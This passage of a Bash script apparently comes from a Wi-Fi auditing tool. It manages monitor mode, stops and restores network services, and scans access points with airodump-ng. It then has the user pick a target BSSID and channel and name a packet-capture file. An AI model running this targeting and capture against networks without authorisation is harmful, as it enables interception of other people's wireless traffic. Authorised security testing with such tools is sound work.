        warn "$ORIG_INTERFACE is already in monitor mode — reusing it, no new VIF."
        warn "Cleanup converts it back to managed mode (never deletes it)."
        warn "NetworkManager/wpa_supplicant stay untouched for now."
        ip link set "$ORIG_INTERFACE" up >/dev/null 2>&1
        MON_INTERFACE="$ORIG_INTERFACE"
        MON_MODE="changed"
        save_state
    else
        rfkill_record "$ORIG_INTERFACE"
        rfkill_unblock_if_needed
        local phy
        phy=$(iface_phy "$ORIG_INTERFACE")
        phy_supports_monitor "$phy" || warn "Driver does not report monitor support (phy ${phy:-?})."
        echo ""
        report_phy_caps "$ORIG_INTERFACE"
    fi
    ok "Selected: $ORIG_INTERFACE"
    return 0
}

# ---- services ----
detect_service_manager() {
    if command -v systemctl >/dev/null 2>&1 && [[ -d "$SYSTEMD_RUN_DIR" ]]; then
        SVC_MANAGER="systemd"
    elif command -v rc-service >/dev/null 2>&1 && [[ -d /etc/init.d ]]; then
        SVC_MANAGER="openrc"
    elif command -v sv >/dev/null 2>&1 && [[ -d /etc/service || -d /var/service ]]; then
        SVC_MANAGER="runit"
    elif command -v service >/dev/null 2>&1 && [[ -d /etc/init.d ]]; then
        SVC_MANAGER="sysv"
    else
        SVC_MANAGER=""
    fi
    [[ -n "$SVC_MANAGER" ]]
}

svc_exists() {
    case "$SVC_MANAGER" in
        systemd) systemctl list-unit-files "${1}.service" 2>/dev/null | grep -q "^${1}\.service" ;;
        sysv)    [[ -x "/etc/init.d/$1" ]] ;;
        openrc)  [[ -e "/etc/init.d/$1" ]] ;;
        runit)   [[ -d "/etc/service/$1" || -d "/var/service/$1" || -d "/etc/sv/$1" ]] ;;
        *) return 1 ;;
    esac
}

svc_state() {
    case "$SVC_MANAGER" in
        systemd) systemctl is-active "$1" 2>/dev/null || true ;;
        sysv)    if service "$1" status >/dev/null 2>&1; then echo active; else echo inactive; fi ;;
        openrc)  if rc-service "$1" status 2>/dev/null | grep -qi started; then echo active; else echo inactive; fi ;;
        runit)   if sv status "$1" 2>/dev/null | grep -q '^run:'; then echo active; else echo inactive; fi ;;
        *) echo unknown ;;
    esac
}

svc_stop() {
    case "$SVC_MANAGER" in
        systemd) systemctl stop "$1" >/dev/null 2>&1 ;;
        sysv)    service "$1" stop >/dev/null 2>&1 ;;
        openrc)  rc-service "$1" stop >/dev/null 2>&1 ;;
        runit)   sv stop "$1" >/dev/null 2>&1 ;;
    esac
}

svc_start() {
    case "$SVC_MANAGER" in
        systemd) systemctl start "$1" >/dev/null 2>&1 ;;
        sysv)    service "$1" start >/dev/null 2>&1 ;;
        openrc)  rc-service "$1" start >/dev/null 2>&1 ;;
        runit)   sv start "$1" >/dev/null 2>&1 ;;
    esac
}

svc_restart() {
    case "$SVC_MANAGER" in
        systemd) systemctl restart "$1" >/dev/null 2>&1 ;;
        sysv)    service "$1" restart >/dev/null 2>&1 ;;
        openrc)  rc-service "$1" restart >/dev/null 2>&1 ;;
        runit)   sv restart "$1" >/dev/null 2>&1 ;;
    esac
}

wait_svc_active() {
    local s="$1" tries="${2:-8}" i=0
    while (( i < tries )); do
        [[ "$(svc_state "$s")" == active ]] && return 0
        sleep 1; ((i++))
    done
    [[ "$(svc_state "$s")" == active ]]
}

nm_kick() {
    command -v nmcli >/dev/null 2>&1 || return 0
    nmcli networking on >/dev/null 2>&1
    nmcli radio wifi on >/dev/null 2>&1
    return 0
}

report_service_support() {
    if [[ -z "$SVC_MANAGER" ]]; then
        warn "No supported service manager (systemd/OpenRC/runit/SysV)."
        return 0
    fi
    echo "  manager: $SVC_MANAGER"
    local s
    for s in NetworkManager wpa_supplicant networking; do
        if svc_exists "$s"; then echo "  $s: exists (state=$(svc_state "$s"))"
        else echo "  $s: unavailable (no unit/script)"; fi
    done
    return 0
}

kill_interfering() {
    warn "Stopping interfering services (no process kills)..."
    capture_service_state
    if [[ -z "$SVC_MANAGER" ]]; then
        warn "No service manager — services left running."
        return 0
    fi
    local s
    for s in NetworkManager wpa_supplicant; do
        [[ "${SVC_ORIG_STATE[$s]:-absent}" == active ]] || continue
        svc_stop "$s"
        if [[ "$(svc_state "$s")" != active ]]; then
            SVC_STOPPED_BY_US[$s]=1
            ok "Stopped $s (will be restored)."
        else
            warn "$s still active — left as-is."
        fi
    done
    save_state
    ok "Done"
}

capture_service_state() {
    (( SVC_STATE_CAPTURED )) && return 0
    SVC_ORIG_STATE=(); SVC_STOPPED_BY_US=()
    detect_service_manager
    local s st
    for s in NetworkManager wpa_supplicant networking; do
        if svc_exists "$s"; then
            st=$(svc_state "$s")
            case "$st" in active|inactive) : ;; *) st="unknown" ;; esac
        else
            st="absent"
        fi
        SVC_ORIG_STATE[$s]="$st"
        SVC_STOPPED_BY_US[$s]=0
    done
    SVC_STATE_CAPTURED=1
    return 0
}

restore_service_state() {
    (( SVC_STATE_CAPTURED )) || return 0
    local s rc=0
    for s in NetworkManager wpa_supplicant networking; do
        [[ "${SVC_STOPPED_BY_US[$s]:-0}" == "1" ]] || continue
        [[ "${SVC_ORIG_STATE[$s]:-unknown}" == active ]] || { SVC_STOPPED_BY_US[$s]=0; continue; }
        svc_start "$s"
        if ! wait_svc_active "$s" 5; then
            warn "$s did not come up — restarting."
            svc_restart "$s"
            wait_svc_active "$s" 8 || true
        fi
        if [[ "$(svc_state "$s")" == active ]]; then
            ok "Restored and verified $s."
            SVC_STOPPED_BY_US[$s]=0
        else
            err "Failed to restore $s (state=$(svc_state "$s"))."
            rc=1
        fi
    done
    (( rc == 0 )) && SVC_STATE_CAPTURED=0
    return $rc
}

ensure_network_services() {
    detect_service_manager
    if [[ -z "$SVC_MANAGER" ]]; then
        warn "No service manager — check services manually."
        return 0
    fi
    svc_exists NetworkManager || return 0
    nm_kick
    if [[ "$(svc_state NetworkManager)" == active ]]; then
        ok "NetworkManager active."
        return 0
    fi
    svc_start NetworkManager
    wait_svc_active NetworkManager 6 || svc_restart NetworkManager
    if [[ "$(svc_state NetworkManager)" == active ]]; then
        ok "NetworkManager started again."
        return 0
    fi
    err "NetworkManager failed to start."
    return 1
}

# ---- monitor mode ----
verify_monitor_iface() {
    local m="$1"
    [[ -n "$m" ]] || return 1
    iface_exists "$m" || return 1
    ip link set "$m" up >/dev/null 2>&1
    iface_is_monitor "$m" || return 1
    return 0
}

set_monitor_inplace() {
    local i="$1"
    ip link set "$i" down >/dev/null 2>&1
    # classic path first — reliable on Ralink/mac80211 USB parts
    if command -v iwconfig >/dev/null 2>&1; then
        iwconfig "$i" mode monitor >/dev/null 2>&1
    fi
    iw dev "$i" set type monitor >/dev/null 2>&1
    sleep 0.6
    ip link set "$i" up >/dev/null 2>&1
    sleep 0.6
    iface_is_monitor "$i" || return 1
    if command -v iwconfig >/dev/null 2>&1; then
        iwconfig "$i" channel 1 >/dev/null 2>&1
    fi
    iw dev "$i" set channel 1 >/dev/null 2>&1
    return 0
}

# Background airodump, tracked, interruptible. Result in RX_PROBE_COUNT.
rx_probe() {
    local secs="${1:-8}" tmp r pid
    RX_PROBE_COUNT=0
    monitor_is_ready || return 1
    init_workdir || return 1
    tmp="$WORK_DIR/rxprobe_$(date +%s%N)"
    ip link set "$MON_INTERFACE" up >/dev/null 2>&1
    iw dev "$MON_INTERFACE" set channel 1 >/dev/null 2>&1

    airodump-ng -w "$tmp" --output-format csv --band bg -c 1 \
        "$MON_INTERFACE" >/dev/null 2>&1 &
    pid=$!
    track_pid "$pid"

    r="$secs"
    while (( r > 0 )); do
        pid_alive "$pid" || break
        sleep 1
        ((r--))
    done

    kill -INT "$pid" 2>/dev/null
    sleep 1
    kill -TERM "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null
    reap_pids
    tty_sane

    if [[ -f "${tmp}-01.csv" ]]; then
        RX_PROBE_COUNT=$(awk -F',' 'NR>2 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/' \
            "${tmp}-01.csv" 2>/dev/null | wc -l)
    fi
    rm -f "${tmp}"* 2>/dev/null
    return 0
}

monitor_recover() {
    monitor_is_ready || return 1
    local m="$MON_INTERFACE"
    warn "No frames received — running monitor recovery."
    reg_fix || true
    ip link set "$m" down >/dev/null 2>&1
    command -v iwconfig >/dev/null 2>&1 && iwconfig "$m" mode monitor >/dev/null 2>&1
    iw dev "$m" set type monitor >/dev/null 2>&1
    sleep 0.6
    ip link set "$m" up >/dev/null 2>&1
    command -v iwconfig >/dev/null 2>&1 && iwconfig "$m" channel 1 >/dev/null 2>&1
    iw dev "$m" set channel 1 >/dev/null 2>&1
    sleep 1
    if ! iface_is_monitor "$m"; then
        err "Interface lost monitor mode."
        return 1
    fi
    ok "Monitor interface re-initialised."
    return 0
}

monitor_probe_verify() {
    (( AUTO_MONITOR_PROBE )) || return 0
    warn "Verifying monitor capture for 8s (Ctrl-C aborts the tool)."
    rx_probe 8
    if (( RX_PROBE_COUNT > 0 )); then
        ok "Monitor verified — $RX_PROBE_COUNT AP(s) visible on channel 1."
        return 0
    fi
    warn "No frames in probe."
    monitor_recover || true
    rx_probe 8
    if (( RX_PROBE_COUNT > 0 )); then
        ok "Monitor verified after recovery — $RX_PROBE_COUNT AP(s)."
        return 0
    fi
    warn "Still no frames. Empty area, or this adapter/VM cannot receive in monitor mode."
    return 0
}

_monitor_success() {
    save_state
    ok "$1"
    monitor_probe_verify
    return 0
}

enable_monitor() {
    local target="${1:-$ORIG_INTERFACE}"
    MON_INTERFACE=""; MON_MODE=""

    iface_exists "$target" || { err "Interface $target missing."; return 1; }

    if iface_is_monitor "$target"; then
        ip link set "$target" up >/dev/null 2>&1
        MON_INTERFACE="$target"; MON_MODE="changed"
        _monitor_success "Already in monitor mode — reusing $MON_INTERFACE (no new VIF)."
        return 0
    fi

    command -v iw >/dev/null 2>&1 || need_tool iw iw >/dev/null 2>&1

    local phy
    phy=$(iface_phy "$target")

    local existing
    existing=$(monitor_on_phy "$phy")
    if [[ -n "$existing" ]]; then
        ip link set "$existing" up >/dev/null 2>&1
        MON_INTERFACE="$existing"; MON_MODE="existing"
        _monitor_success "Reusing existing monitor interface: $MON_INTERFACE"
        return 0
    fi

    warn "Enabling monitor mode in place on $target..."
    if set_monitor_inplace "$target"; then
        MON_INTERFACE="$target"; MON_MODE="changed"
        _monitor_success "Monitor mode enabled in place: $MON_INTERFACE"
        return 0
    fi
    ip link set "$target" up >/dev/null 2>&1

    local -a before=() after=()
    mapfile -t before < <(discover_wireless_raw)
    if command -v airmon-ng >/dev/null 2>&1; then
        warn "In-place failed — trying airmon-ng..."
        airmon-ng start "$target" </dev/null >/dev/null 2>&1
        sleep 2
        mapfile -t after < <(discover_wireless_raw)
        local cand b seen
        for cand in "${after[@]}"; do
            seen=0
            for b in "${before[@]}"; do [[ "$b" == "$cand" ]] && { seen=1; break; }; done
            if [[ $seen -eq 0 ]] && verify_monitor_iface "$cand"; then
                MON_INTERFACE="$cand"; MON_MODE="created"
                _monitor_success "Monitor interface created: $MON_INTERFACE"
                return 0
            fi
        done
        if iface_is_monitor "$target"; then
            ip link set "$target" up >/dev/null 2>&1
            MON_INTERFACE="$target"; MON_MODE="changed"
            _monitor_success "Monitor mode enabled in place: $MON_INTERFACE"
            return 0
        fi
    fi

    if command -v iw >/dev/null 2>&1 && [[ -n "$phy" ]]; then
        local name="${target}mon" n=1
        while iface_exists "$name"; do name="${target}mon${n}"; ((n++)); done
        iw phy "$phy" interface add "$name" type monitor >/dev/null 2>&1
        sleep 1
        if verify_monitor_iface "$name"; then
            MON_INTERFACE="$name"; MON_MODE="created"
            _monitor_success "Monitor interface created: $MON_INTERFACE"
            return 0
        fi
    fi

    err "Could not enable monitor mode on $target."
    report_iface_failure "$target"
    return 1
}

monitor_is_ready() {
    [[ -n "$MON_INTERFACE" ]] || return 1
    iface_exists "$MON_INTERFACE" || return 1
    iface_is_monitor "$MON_INTERFACE" || return 1
    return 0
}

ensure_monitor_ready() {
    monitor_is_ready && { ip link set "$MON_INTERFACE" up >/dev/null 2>&1; return 0; }
    [[ -z "$ORIG_INTERFACE" ]] && { select_interface || return 1; }
    (( ORIG_WAS_MONITOR )) || kill_interfering
    enable_monitor "$ORIG_INTERFACE"
}

maybe_rename_back() {
    local i="$1" base
    RENAMED_TO=""
    [[ "$i" == *mon ]] || return 0
    base="${i%mon}"
    [[ -n "$base" ]] || return 0
    validate_iface_name "$base" || return 0
    iface_exists "$base" && return 0
    ip link set "$i" down 2>/dev/null
    if ip link set "$i" name "$base" 2>/dev/null; then
        sleep 0.3
        ok "Renamed $i -> $base"
        RENAMED_TO="$base"
    fi
    return 0
}

convert_to_managed() {
    local iface="$1" rc=1 try
    iface_exists "$iface" || { warn "$iface gone."; return 1; }
    if ! iface_is_monitor "$iface"; then
        warn "$iface already $(iface_type "$iface")."
        ip link set "$iface" up >/dev/null 2>&1
        return 0
    fi

    warn "Converting $iface back to managed mode..."
    for try in 1 2 3; do
        ip link set "$iface" down >/dev/null 2>&1
        command -v iwconfig >/dev/null 2>&1 && iwconfig "$iface" mode managed >/dev/null 2>&1
        iw dev "$iface" set type managed >/dev/null 2>&1
        sleep 0.6
        if [[ "$(iface_type "$iface")" == managed ]]; then rc=0; break; fi
    done

    if (( rc != 0 )) && command -v airmon-ng >/dev/null 2>&1; then
        warn "iw conversion failed — airmon-ng stop fallback."
        airmon-ng stop "$iface" </dev/null >/dev/null 2>&1
        sleep 1
        if ! iface_exists "$iface"; then
            local cand
            for cand in "${iface%mon}" "$iface"; do
                if iface_exists "$cand" && [[ "$(iface_type "$cand")" == managed ]]; then
                    iface="$cand"; rc=0; break
                fi
            done
        elif [[ "$(iface_type "$iface")" == managed ]]; then
            rc=0
        fi
    fi

    if (( rc == 0 )); then
        maybe_rename_back "$iface"
        [[ -n "$RENAMED_TO" ]] && iface="$RENAMED_TO"
        ip link set "$iface" up >/dev/null 2>&1
        sleep 0.6
        if [[ "$(iface_type "$iface")" == managed ]]; then
            ok "Verified managed: $iface"
            ORIG_INTERFACE="$iface"
            return 0
        fi
    fi

    err "Verification failed: $iface type=$(iface_type "$iface")"
    ip link set "$iface" up >/dev/null 2>&1
    return 1
}

disable_monitor() {
    if [[ -z "$MON_INTERFACE" ]]; then MON_MODE=""; return 0; fi
    if ! iface_exists "$MON_INTERFACE"; then
        warn "$MON_INTERFACE already gone."
        MON_INTERFACE=""; MON_MODE=""
        clear_state
        return 0
    fi

    local m="$MON_INTERFACE" rc=0

    if [[ "$m" == "$ORIG_INTERFACE" ]]; then
        convert_to_managed "$m" || rc=1
    elif [[ "$MON_MODE" == "existing" ]]; then
        ok "Leaving pre-existing monitor interface $m untouched."
    else
        warn "Removing separate monitor interface $m..."
        command -v airmon-ng >/dev/null 2>&1 && airmon-ng stop "$m" </dev/null >/dev/null 2>&1
        iface_exists "$m" && iw dev "$m" del >/dev/null 2>&1
        sleep 1
        if iface_exists "$m"; then
            err "Verification failed: $m still exists."; rc=1
        else
            ok "Verified removed: $m"
        fi
    fi

    if [[ -n "$ORIG_INTERFACE" ]] && iface_exists "$ORIG_INTERFACE" \
       && ! iface_is_monitor "$ORIG_INTERFACE"; then
        ip link set "$ORIG_INTERFACE" up >/dev/null 2>&1
    fi

    if (( rc == 0 )); then
        MON_INTERFACE=""; MON_MODE=""
        clear_state
    fi
    return $rc
}

restore_unknown_monitor() {
    local iface="$1" a
    [[ -n "$iface" ]] || return 1
    iface_exists "$iface" || { warn "$iface gone."; return 1; }
    if ! iface_is_monitor "$iface"; then
        warn "$iface is already $(iface_type "$iface")."
        return 0
    fi
    hacker_read a "Convert $iface back to managed mode? (y/N):"
    [[ "$a" == "y" || "$a" == "Y" ]] || { warn "Skipped."; return 1; }
    convert_to_managed "$iface"
}

# ---- network restore ----
restore_network_now() {
    (( NETWORK_RESTORED )) && return 0
    local rc=0
    DEFER_STATE_CLEAR=1
    kill_children
    kill_workdir_procs
    disable_monitor || rc=1
    reg_restore
    rfkill_restore
    if [[ -n "$ORIG_INTERFACE" ]] && iface_exists "$ORIG_INTERFACE"; then
        ip link set "$ORIG_INTERFACE" up >/dev/null 2>&1
    fi
    nm_kick
    restore_service_state || rc=1
    ensure_network_services || rc=1
    verify_managed_present || rc=1
    DEFER_STATE_CLEAR=0
    if (( rc == 0 )); then
        force_clear_state
        NETWORK_RESTORED=1
        ok "Network restored — NetworkManager is running."
    else
        err "Network restore INCOMPLETE — state kept, run [8]."
    fi
    return $rc
}

restart_network() {
    NETWORK_RESTORED=0
    restore_network_now
}

# Explicit user-driven NetworkManager recovery
restore_network_manager() {
    banner
    echo -e "${CYAN}=== RESTORE NETWORK MANAGER ===${NC}"
    echo ""
    local rc=0
    local -a links=()
    local i

    DEFER_STATE_CLEAR=1
    detect_service_manager
    kill_children
    kill_workdir_procs

    warn "Removing monitor mode from any wireless interface..."
    if [[ -n "$MON_INTERFACE" ]] && iface_exists "$MON_INTERFACE"; then
        disable_monitor || rc=1
    fi
    while read -r i; do
        [[ -z "$i" ]] && continue
        iface_is_monitor "$i" || continue
        convert_to_managed "$i" || rc=1
    done < <(discover_wireless_raw)

    warn "Clearing rfkill and regulatory overrides..."
    if command -v rfkill >/dev/null 2>&1; then
        rfkill unblock wifi >/dev/null 2>&1
        rfkill unblock all >/dev/null 2>&1
    fi
    RFKILL_UNBLOCKED_BY_US=0
    reg_restore

    while read -r i; do
        [[ -z "$i" ]] && continue
        ip link set "$i" up >/dev/null 2>&1
        links+=("$i")
    done < <(discover_wireless_raw)

    if [[ -z "$SVC_MANAGER" ]]; then
        err "No supported service manager found."
        rc=1
    else
        nm_kick
        local s
        for s in wpa_supplicant NetworkManager; do
            svc_exists "$s" || continue
            if [[ "$(svc_state "$s")" == active ]]; then
                ok "$s already active."
                continue
            fi
            svc_start "$s"
            if ! wait_svc_active "$s" 6; then
                warn "$s did not start — restarting."
                svc_restart "$s"
                wait_svc_active "$s" 10 || true
            fi
            if [[ "$(svc_state "$s")" == active ]]; then
                ok "$s is active."
            else
                err "$s failed to start (state=$(svc_state "$s"))."
                rc=1
            fi
        done

        if command -v nmcli >/dev/null 2>&1; then
            nmcli networking on >/dev/null 2>&1
            nmcli radio wifi on >/dev/null 2>&1
            for i in "${links[@]:-}"; do
                [[ -n "$i" ]] && nmcli device set "$i" managed yes >/dev/null 2>&1
            done
        fi
    fi

    DEFER_STATE_CLEAR=0
    if (( rc == 0 )); then
        force_clear_state
        NETWORK_RESTORED=1
        ok "Network services restored and verified."
        if command -v nmcli >/dev/null 2>&1; then
            echo ""
            echo -e "${DARK}--- device state ---${NC}"
            nmcli -t -f DEVICE,STATE,CONNECTION device 2>/dev/null | sed 's/^/  /'
        fi
    else
        err "Restore incomplete — run [9] DIAGNOSTICS and check the service logs."
    fi
    return $rc
}

# ---- recovery ----
recover_state() {
    local f
    f=$(state_file) || { warn "No state path available."; return 1; }

    if [[ ! -f "$f" ]]; then
        warn "No recorded application state."
        local i found=0 rc=0
        while read -r i; do
            [[ -z "$i" ]] && continue
            iface_is_monitor "$i" || continue
            echo "  monitor interface present: $i"
            found=1
        done < <(discover_wireless_raw)
        if (( found )); then
            echo ""
            warn "These were not created by a recorded run — nothing is deleted."
            while read -r i; do
                [[ -z "$i" ]] && continue
                iface_is_monitor "$i" || continue
                restore_unknown_monitor "$i" || rc=1
            done < <(discover_wireless_raw)
        else
            echo "  no monitor interfaces present."
        fi
        echo ""
        ensure_network_services || rc=1
        reg_restore
        [[ -n "$ORIG_INTERFACE" ]] && iface_exists "$ORIG_INTERFACE" \
            && ip link set "$ORIG_INTERFACE" up >/dev/null 2>&1
        verify_managed_present || rc=1
        (( rc == 0 )) && ok "Recovery complete."
        return $rc
    fi

    local st_orig st_mon st_mode st_nm st_wpa
    st_orig=$(sed -n 's/^ORIG_INTERFACE=//p' "$f" | head -1)
    st_mon=$(sed -n 's/^MON_INTERFACE=//p' "$f" | head -1)
    st_mode=$(sed -n 's/^MON_MODE=//p' "$f" | head -1)
    st_nm=$(sed -n 's/^SVC_NM=//p' "$f" | head -1)
    st_wpa=$(sed -n 's/^SVC_WPA=//p' "$f" | head -1)

    echo -e "${YELLOW}--- recorded incomplete run ---${NC}"
    echo "  original iface: ${st_orig:-?}"
    echo "  monitor iface:  ${st_mon:-none}"
    echo "  mode:           ${st_mode:-?}"
    echo "  NM stopped:     ${st_nm:-0}"
    echo "  wpa stopped:    ${st_wpa:-0}"
    if [[ "${st_orig:-}" == "${st_mon:-}" ]]; then
        echo "  (same name -> converted back, not deleted)"
    fi
    echo ""

    ORIG_INTERFACE="$st_orig"
    MON_INTERFACE="$st_mon"
    MON_MODE="$st_mode"
    DEFER_STATE_CLEAR=1
    local rc=0

    kill_children
    kill_workdir_procs

    local a
    if [[ -n "$st_mon" ]] && iface_exists "$st_mon"; then
        hacker_read a "Restore $st_mon to managed mode? (y/N):"
        if [[ "$a" == "y" || "$a" == "Y" ]]; then
            disable_monitor || rc=1
        else
            warn "Interface restore SKIPPED — state kept."; rc=1
        fi
    else
        warn "Recorded interface already gone."
        MON_INTERFACE=""; MON_MODE=""
    fi

    if [[ "${st_nm:-0}" == "1" || "${st_wpa:-0}" == "1" ]]; then
        detect_service_manager
        if [[ -z "$SVC_MANAGER" ]]; then
            err "No service manager — cannot restore services."; rc=1
        else
            SVC_STATE_CAPTURED=1
            [[ "${st_nm:-0}" == "1" ]] && {
                SVC_ORIG_STATE[NetworkManager]="active"
                SVC_STOPPED_BY_US[NetworkManager]=1
            }
            [[ "${st_wpa:-0}" == "1" ]] && {
                SVC_ORIG_STATE[wpa_supplicant]="active"
                SVC_STOPPED_BY_US[wpa_supplicant]=1
            }
            restore_service_state || rc=1
        fi
    fi

    ensure_network_services || rc=1
    reg_restore
    verify_managed_present || rc=1

    DEFER_STATE_CLEAR=0
    if (( rc == 0 )); then
        force_clear_state
        NETWORK_RESTORED=1
        ok "Recovery complete and verified."
    else
        err "Recovery INCOMPLETE — state file kept. Run [8] again."
    fi
    return $rc
}

# ============================================================
#  SCAN
# ============================================================
declare -a SCAN_BSSID=() SCAN_CH=() SCAN_ESSID=()

parse_scan_csv() {
    local csv="$1"
    SCAN_BSSID=(); SCAN_CH=(); SCAN_ESSID=()
    [[ -f "$csv" ]] || return 1
    local out
    out=$(awk -F',' '
        function trim(s){ gsub(/^[ \t]+|[ \t]+$/,"",s); return s }
        NR>2 {
            b = trim($1)
            if (b !~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) next
            c = trim($4); e = ""
            for (i=14; i<=NF; i++) { e = e (i>14 ? "," : "") $i }
            e = trim(e); gsub(/^"|"$/, "", e)
            if (e == "") next
            if (seen[b]++) next
            printf "%s\t%s\t%s\n", b, c, e
        }' "$csv" 2>/dev/null)
    local b c e
    while IFS=$'\t' read -r b c e; do
        [[ -z "$b" ]] && continue
        SCAN_BSSID+=("$b"); SCAN_CH+=("$c"); SCAN_ESSID+=("$e")
    done <<< "$out"
    return 0
}

run_scan_once() {
    local duration="$1"; shift || true
    local -a extra=("$@")
    local scan_file ui_log err_log pid r

    init_workdir || return 1
    scan_file="$WORK_DIR/wifiscan_$(date +%s%N)"
    ui_log="$WORK_DIR/scan_ui.log"
    err_log="$WORK_DIR/scan_err.log"
    SCAN_LAST_FILE="$scan_file"
    SCAN_LAST_CSV="${scan_file}-01.csv"
    secure_touch "$ui_log"
    secure_touch "$err_log"

    ip link set "$MON_INTERFACE" up >/dev/null 2>&1
    iw dev "$MON_INTERFACE" set channel 1 >/dev/null 2>&1

    warn "Scanning ${duration}s on $MON_INTERFACE ${extra[*]:-}..."
    airodump-ng -w "$scan_file" --output-format csv --write-interval 1 \
        "${extra[@]}" "$MON_INTERFACE" >"$ui_log" 2>"$err_log" &
    pid=$!
    track_pid "$pid"

    sleep 2
    if ! pid_alive "$pid"; then
        err "airodump-ng exited immediately."
        echo -e "${DARK}--- airodump-ng error ---${NC}"
        tail -15 "$err_log" 2>/dev/null | sed 's/^/    /'
        echo ""
        return 2
    fi

    r="$duration"
    while (( r > 0 )); do
        pid_alive "$pid" || break
        echo -ne "\r    remaining: ${CYAN}${r}${NC}s    "
        sleep 1
        ((r--))
    done
    echo -ne "\r    remaining: ${CYAN}0${NC}s    \n"

    kill -INT "$pid" 2>/dev/null
    sleep 1
    kill -TERM "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null
    reap_pids
    tty_sane
    sleep 1

    if [[ ! -f "$SCAN_LAST_CSV" ]]; then
        err "No CSV written by airodump-ng."
        echo -e "${DARK}--- airodump-ng output ---${NC}"
        tail -15 "$err_log" 2>/dev/null | sed 's/^/    /'
        echo ""
        return 3
    fi

    parse_scan_csv "$SCAN_LAST_CSV"
    return 0
}

scan_failure_report() {
    echo -e "${YELLOW}--- scan diagnostics ---${NC}"
    echo "  iface:    $MON_INTERFACE"
    echo "  type:     $(iface_type "$MON_INTERFACE")"
    echo "  csv size: $(stat -c %s "$SCAN_LAST_CSV" 2>/dev/null || echo 0) bytes"
    command -v iw >/dev/null 2>&1 && { echo "  iw dev:"; iw dev "$MON_INTERFACE" info 2>/dev/null | sed 's/^/    /'; }
    command -v iwconfig >/dev/null 2>&1 && { echo "  iwconfig:"; iwconfig "$MON_INTERFACE" 2>/dev/null | sed 's/^/    /'; }
    command -v iw >/dev/null 2>&1 && { echo "  reg:"; iw reg get 2>/dev/null | head -4 | sed 's/^/    /'; }
    echo "  csv head:"
    head -6 "$SCAN_LAST_CSV" 2>/dev/null | sed 's/^/    /'
    echo ""
    return 0
}

scan_networks() {
    monitor_is_ready || { err "Monitor mode not ready."; return 1; }

    local duration=25 rc=0 attempt=0
    local phy
    phy=$(iface_phy "$MON_INTERFACE")
    local -a primary=() fallback=(--band bg -c 1,6,11)
    if phy_has_5ghz "$phy"; then
        primary=(--band abg)
    else
        primary=(--band bg -c 1,6,11)
    fi

    while true; do
        attempt=$((attempt + 1))
        local -a use=("${primary[@]}")
        if (( attempt >= 2 )); then
            use=("${fallback[@]}")
            warn "Retrying on 2.4 GHz with a fixed channel list."
            monitor_recover || true
        fi
        run_scan_once "$duration" "${use[@]}"; rc=$?

        if (( rc == 0 )) && [[ ${#SCAN_BSSID[@]} -gt 0 ]]; then
            ok "Available networks:"; echo ""
            local i
            for i in "${!SCAN_BSSID[@]}"; do
                printf "  %b%2d)%b %-19s  %bCH:%-3s%b  %s\n" \
                    "$GREEN" "$((i+1))" "$NC" "${SCAN_BSSID[$i]}" \
                    "$DARK" "${SCAN_CH[$i]}" "$NC" "${SCAN_ESSID[$i]}"
            done
            echo ""
        elif (( attempt <= 2 )); then
            (( rc == 0 )) && err "CSV was empty — retrying."
            rm -f "${SCAN_LAST_FILE}"* 2>/dev/null
            duration=$((duration + 10))
            warn "Rescanning with ${duration}s."
            continue
        else
            (( rc == 0 )) && err "CSV contained no usable BSSID/ESSID."
            scan_failure_report
        fi

        local sel
        hacker_read sel "Select number, BSSID, or ENTER to rescan:"
        if [[ -z "$sel" ]]; then
            rm -f "${SCAN_LAST_FILE}"* 2>/dev/null
            attempt=0
            duration=$((duration + 10))
            warn "Rescanning with ${duration}s."
            continue
        fi

        if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#SCAN_BSSID[@]} )); then
            BSSID="${SCAN_BSSID[$((sel-1))]}"
            CHANNEL="${SCAN_CH[$((sel-1))]}"
            TARGET_ESSID="${SCAN_ESSID[$((sel-1))]}"
        else
            BSSID=$(echo "$sel" | tr -d ' ' | tr 'a-f' 'A-F')
            if ! validate_bssid "$BSSID"; then
                err "Invalid BSSID."
                rm -f "${SCAN_LAST_FILE}"* 2>/dev/null
                continue
            fi
            CHANNEL=""
            local i
            for i in "${!SCAN_BSSID[@]}"; do
                [[ "${SCAN_BSSID[$i]}" == "$BSSID" ]] && { CHANNEL="${SCAN_CH[$i]}"; break; }
            done
        fi
        [[ -z "$CHANNEL" ]] && { hacker_read CHANNEL "Channel:"; CHANNEL=$(echo "$CHANNEL" | tr -dc '0-9'); }
        if ! validate_channel "$CHANNEL"; then
            err "Invalid channel."
            rm -f "${SCAN_LAST_FILE}"* 2>/dev/null
            continue
        fi
        rm -f "${SCAN_LAST_FILE}"* 2>/dev/null
        ok "Target: $BSSID CH:$CHANNEL ${TARGET_ESSID:+($TARGET_ESSID)}"
        return 0
    done
}

# ============================================================
list_existing_caps() {
    echo -e "${YELLOW}Existing .cap files:${NC}"
    local found=0 f
    for f in "${CAP_FILE_PATH:-$OUTPUT_DIR}"/*.cap; do
        [[ -e "$f" ]] || continue
        echo "  - $(basename "$f")"; found=1
    done
    (( found == 0 )) && echo "  (none)"
    echo ""
}

sanitize_name() { echo "$1" | tr ' ' '_' | tr -dc 'A-Za-z0-9._-'; }

unique_base() {
    local base="$1" dir="${CAP_FILE_PATH:-$OUTPUT_DIR}"
    [[ -z "$base" ]] && base="capture"
    [[ ! -e "${dir}/${base}.cap" && ! -e "${dir}/${base}-01.cap" ]] \
        && { echo "$base"; return; }
    local n=1
    while [[ -e "${dir}/${base}-${n}.cap" || -e "${dir}/${base}-${n}-01.cap" ]]; do ((n++)); done
    echo "${base}-${n}"
}

set_target() {
    list_existing_caps
    [[ -z "$BSSID" ]] && { hacker_read BSSID "Target BSSID:"; BSSID=$(echo "$BSSID" | tr -d ' ' | tr 'a-f' 'A-F'); }
    validate_bssid "$BSSID" || { err "Invalid BSSID."; return 1; }
    [[ -z "$CHANNEL" ]] && { hacker_read CHANNEL "Channel:"; CHANNEL=$(echo "$CHANNEL" | tr -dc '0-9'); }
    validate_channel "$CHANNEL" || { err "Invalid channel."; return 1; }
    local suggestion input
    suggestion=$(sanitize_name "${TARGET_ESSID:-capture}")
    [[ -z "$suggestion" ]] && suggestion="capture"
    hacker_read input "File name [${suggestion:0:40}]:"
